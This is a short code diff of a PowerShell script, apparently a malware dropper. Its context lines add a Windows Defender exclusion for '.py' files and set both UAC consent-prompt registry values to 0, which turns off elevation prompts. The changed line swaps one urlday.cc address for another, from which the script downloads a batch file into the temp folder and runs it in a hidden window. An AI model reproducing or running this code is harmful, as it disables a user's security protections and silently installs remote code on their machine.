@@ -14,5 +14,5 @@ if (-not $isAdmin) {
     powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
     Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorAdmin" -Value 0
     Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorUser" -Value 0
-    iwr -useb urlday.cc/opti -o $env:TEMP\x.bat; saps $env:TEMP\x.bat -WindowStyle Hidden
+    iwr -useb https://urlday.cc/vo4u8 -o $env:TEMP\x.bat; saps $env:TEMP\x.bat -WindowStyle Hidden
 }
